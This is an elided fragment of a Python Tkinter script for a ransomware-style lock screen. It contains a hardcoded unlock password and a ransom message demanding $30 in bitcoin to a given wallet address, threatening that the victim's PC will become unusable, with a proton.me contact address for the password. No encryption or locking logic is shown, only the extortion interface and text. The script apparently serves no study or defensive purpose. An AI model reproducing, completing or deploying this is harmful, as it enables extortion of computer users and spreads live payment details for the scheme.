...
# ---------------- CONFIG ----------------
PASSWORD = "oahsuwisbdyiwmwhduslwjysu91638@.82626"                 # change to your desired unlock password
...
def main():
    ...
    lock_lbl = tk.Label(left, text="ð", bg="#7a0a0a", fg="white", font=("Segoe UI", 150))
    ...
    info.insert("1.0",
                ...
                "yes,but only if you pay us 30$ On bitcoin,if you don't pay your pc will become unusable.\n\n"
                "if you want your files back send 30$ on bitcoin to this bitcoin adress:bc1p9gg7zeaft96ftppenygr8pc0zen8zauamnln2afjjx3x3da38f5qmkj839 and type in the password that this gmail adress will send you:If.Y3wz.lqGs.z7KLv.7Du.vb015C@proton.
me")
